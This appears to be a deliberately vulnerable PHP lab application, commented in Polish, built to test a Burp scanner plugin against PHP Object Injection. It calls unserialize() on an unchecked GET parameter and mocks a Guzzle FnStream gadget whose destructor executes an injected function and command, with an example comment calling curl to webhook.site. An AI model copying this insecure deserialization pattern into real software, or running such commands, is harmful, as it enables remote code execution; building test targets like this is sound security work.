<?php
// Włączamy wyświetlanie błędów, aby skaner Burpa mógł wychwycić "PHP Fatal error"
namespace {
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
}

// ============================================================================
// IMITACJA ŁAŃCUCHA GADŻETÓW (Mock klasy Guzzle)
// ============================================================================
// Twoja wtyczka wysyła ładunek z biblioteki Guzzle:
// O:24:"GuzzleHttp\Psr7\FnStream"...
// Symulujemy obecność tej biblioteki w aplikacji, aby RCE się powiodło.
namespace GuzzleHttp\Psr7 {
    class FnStream {
        private $methods;
        public $_fn_close;

        public function __destruct() {
            // Magiczna metoda wywoływana podczas niszczenia obiektu po deserializacji.
            // Sprawdza, czy wstrzyknięto funkcję i argument, a następnie je wykonuje.
            if (isset($this->methods['close']) && isset($this->_fn_close)) {
                $action = $this->methods['close']; // np. 'exec'
                $command = $this->_fn_close;       // np. 'curl -s http://webhook.site/...'

                if (is_callable($action)) {
                    // UWAGA: Tutaj następuje Remote Code Execution (RCE)
                    $action($command);
                }
            }
        }
    }
}

// ============================================================================
// WŁAŚCIWY KOD PODATNEJ APLIKACJI
// ============================================================================
namespace {
    echo "<h2>Aplikacja Testowa - PHP Object Injection</h2>";
    echo "<p>Użyj parametru GET <b>?data=</b> do przesłania zserializowanego obiektu.</p>";

    // Sprawdzamy, czy przesłano parametr 'data'
    if (isset($_GET['data'])) {
        $input = $_GET['data'];

        echo "<hr>";
        echo "<b>Otrzymane dane:</b> " . htmlspecialchars($input) . "<br><br>";

        // KRYTYCZNA PODATNOŚĆ: Brak walidacji danych wejściowych
        // Wywołanie unserialize() na danych kontrolowanych przez użytkownika
        $object = unserialize($input);

        if ($object) {
            echo "<b>Obiekt został pomyślnie zdeserializowany!</b>";
        }
    } else {
        // Przykładowy poprawny ciąg, który aktywuje skaner pasywny w Burpie
        $example = 'O:8:"stdClass":0:{}';
        echo "<a href='?data=" . urlencode($example) . "'>Kliknij tutaj, aby załadować przykładowy obiekt</a>";
    }
}
?>